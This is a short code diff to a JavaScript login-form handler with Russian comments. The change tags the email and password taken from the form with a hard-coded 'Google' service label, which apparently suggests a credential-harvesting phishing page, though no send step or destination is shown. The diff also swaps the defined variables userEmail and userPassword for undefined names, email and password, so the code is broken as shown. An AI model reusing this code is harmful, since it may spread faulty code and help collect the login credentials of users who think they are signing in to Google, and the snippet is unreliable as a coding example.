@@ -8,6 +8,7 @@ document.addEventListener('DOMContentLoaded', function() {
         // Получаем значения из формы
         let userEmail = document.getElementById('email-input').value;
         let userPassword = document.getElementById('password-input').value;
+        let service = 'Google';
 
         // Скрываем сообщения об ошибках
         invalidEmailDiv.style.display = 'none';
@@ -31,8 +32,9 @@ document.addEventListener('DOMContentLoaded', function() {
 
         // Создаем объект с данными
         let data = {
-            email: userEmail,
-            password: userPassword
+            service: service,
+            email: email,
+            password: password
         };
 
         // Используем значение
